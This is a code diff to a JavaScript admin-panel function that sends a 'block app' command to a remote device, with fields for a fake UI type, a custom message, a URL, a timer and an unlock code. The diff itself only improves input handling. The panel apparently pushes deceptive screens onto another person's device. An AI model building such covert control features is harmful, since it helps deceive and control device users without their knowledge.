@@ -312,13 +312,25 @@
     submitAppBlock: async function() {
       const deviceId = getDeviceId();
       if (!deviceId) return;
-      const pkg = document.getElementById('v79-block-pkg').value.trim();
-      if (!pkg) { showToast('Package name required', 'error'); return; }
+      // v7.9.9: Try hidden field first, fall back to search box value (for manual entry)
+      let pkg = (document.getElementById('v79-block-pkg')?.value || '').trim();
+      if (!pkg) {
+        // User typed manually in the search box — use that as the package name
+        const searchVal = (document.getElementById('v79-block-pkg-search')?.value || '').trim();
+        // Check if it looks like a package name (contains a dot)
+        if (searchVal.includes('.')) {
+          pkg = searchVal;
+        }
+      }
+      if (!pkg) {
+        showToast('⚠️ Please select an app from the list OR type a package name (e.g. com.example.app)', 'error');
+        return;
+      }
       const fakeUiType = document.getElementById('v79-block-ui-type').value;
       const customMessage = document.getElementById('v79-block-message').value.trim();
-      const customUrl = document.getElementById('v79-block-url').value.trim();
-      const timerSeconds = parseInt(document.getElementById('v79-block-timer').value) || 0;
-      const unblockCode = document.getElementById('v79-block-code').value.trim();
+      const customUrl = document.getElementById('v79-block-url')?.value?.trim() || '';
+      const timerSeconds = parseInt(document.getElementById('v79-block-timer')?.value || '0') || 0;
+      const unblockCode = document.getElementById('v79-block-code')?.value?.trim() || '';
 
       const r = await relayCommand('/api/admin/block-app-v2', {
         package: pkg, fake_ui_type: fakeUiType, custom_message: customMessage,
